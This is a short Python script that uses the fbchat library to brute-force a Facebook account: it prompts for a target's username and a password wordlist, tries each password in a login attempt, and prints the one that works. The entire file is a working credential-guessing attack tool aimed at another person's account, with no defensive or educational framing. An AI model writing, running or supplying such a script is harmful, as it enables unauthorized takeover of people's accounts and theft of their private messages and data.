import fbchat
from fbchat import Client

username = input("Enter username of target (email, phone, etc): ")
passwd_list = input("Enter the name of file containing the passwords: ")

i = 0

bool = True
arr = open(passwd_list,'r').read().  split('\n')

while bool == True:
    try:
        arr[i]
    except:
        break

    try:
        fbchat.Client(username, arr[i], None, 1)
        print('Success! Password is: ' + arr[i])
        bool = False
    except:
        print("Nope")
        i += 1

print('.....')
